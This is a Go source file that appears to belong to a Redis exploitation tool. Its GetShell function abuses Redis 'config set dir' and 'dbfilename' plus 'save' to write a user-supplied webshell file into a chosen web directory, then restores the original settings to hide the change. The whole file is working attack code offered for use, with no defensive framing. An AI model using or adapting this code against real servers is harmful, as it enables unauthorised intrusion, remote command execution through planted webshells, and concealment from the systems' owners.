package pkg

import (
	"context"
	"fmt"
	"io/ioutil"
	"time"
)

// GetShell 备份写shell
func GetShell() {
	var webDir, webFilename, shell string

	fmt.Print("设置保存的路径: ")
	fmt.Scanln(&webDir)

	dir := fmt.Sprintf("config set dir %v", webDir)
	Info(dir)
	Success(RedisCmd(dir))

	fmt.Print("设置保存的文件名：")
	fmt.Scanln(&webFilename)

	file := fmt.Sprintf("config set dbfilename %v", webFilename)
	Info(file)
	Success(RedisCmd(file))

	var payload []byte
	var err error

	for {
		fmt.Print("输入本地 Webshell 文件路径：")
		fmt.Scanln(&shell)
		payload, err = ioutil.ReadFile(shell)
		if err != nil {
			Err(err)
		} else {
			break
		}
	}

	Info(string(payload))

	ctx := context.Background()
	err = Rdb.Set(ctx, "shell", string(payload), time.Minute*2).Err()
	if err != nil {
		Err(err)
	}

	Info("save")
	Success(RedisCmd("save"))

	dir2 := fmt.Sprintf("config set dir %v", redisDir)
	Info(dir2)
	Success(RedisCmd(dir2))

	db := fmt.Sprintf("config set dbfilename %v", redisDbfilename)
	Info(db)
	Success(RedisCmd(db))

	Info("save")
	Success(RedisCmd("save"))
}
